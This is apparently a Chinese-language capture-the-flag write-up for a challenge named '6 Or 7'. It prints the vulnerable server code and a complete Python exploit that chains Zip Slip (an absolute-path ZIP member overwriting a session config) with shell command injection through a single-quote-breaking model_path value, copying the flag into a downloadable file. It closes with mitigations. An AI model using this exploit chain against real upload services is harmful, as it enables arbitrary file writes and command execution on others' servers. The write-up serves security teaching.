# 6 Or 7

## 题目简述

网站允许为每个 UUID 会话上传图片或 ZIP，再调用一个 6/7 分类器。模型本身不是攻击目标；ZIP 解包允许绝对路径写入会话配置，而配置中的 `model_path` 又未经转义拼进 shell 命令。两处缺陷组合后可以把服务器上的 flag 复制到可下载的缩略图目录。

## 解题过程

上传 ZIP 时，服务端手工拼接目标路径：

```python
member_name = member.filename
dest_path = os.path.join(user_folder, member_name)
with zf.open(member) as source, open(dest_path, "wb") as target:
    target.write(source.read())
```

若 `member_name` 是绝对路径，`os.path.join` 会丢弃前面的 `user_folder`。先申请 token，再把伪造的 `data.json` 写到 `/app/data/<token>/data.json`。预测接口从这个位置加载配置，并执行：

```python
os.popen(
    f"python3 predictor/predict.py '{user_data['model_path']}' '{file_path}'"
).read()
```

因此令 `model_path` 闭合单引号并追加 `cp`：

```python
import io
import json
import zipfile
import requests

base = "http://TARGET"
token = requests.post(f"{base}/api/session").json()["token"]
image = requests.get(f"{base}/static/seven2.png").content

config = {
    "cache": {},
    "model_path": (
        f"';cp /flag* /app/data/{token}/thumbnails/flag.png;#"
    ),
}

archive = io.BytesIO()
with zipfile.ZipFile(archive, "w") as zf:
    zf.writestr("seven2.png", image)
    zf.writestr(
        f"/app/data/{token}/data.json",
        json.dumps(config),
    )

requests.post(
    f"{base}/api/upload/{token}",
    files={"file": ("data.zip", archive.getvalue())},
)
requests.post(f"{base}/api/predict/{token}")
flag = requests.get(
    f"{base}/api/session/{token}/thumbnails/flag.png"
).text
print(flag)
```

虽然文件扩展名是 `.png`，服务端只按名称和固定 MIME 类型发送，并不校验内容，因此文本 flag 可以直接读出：

```text
grey{6767_un54f3_3x7r4c7_6767}
```

## 方法总结

本题是跨阶段漏洞链：Zip Slip 提供任意路径写，配置注入再提供命令执行，缩略图接口负责回显。安全解包应拒绝绝对路径和越出根目录的规范化路径；调用模型脚本则应使用参数数组而不是把配置值拼接进 shell。
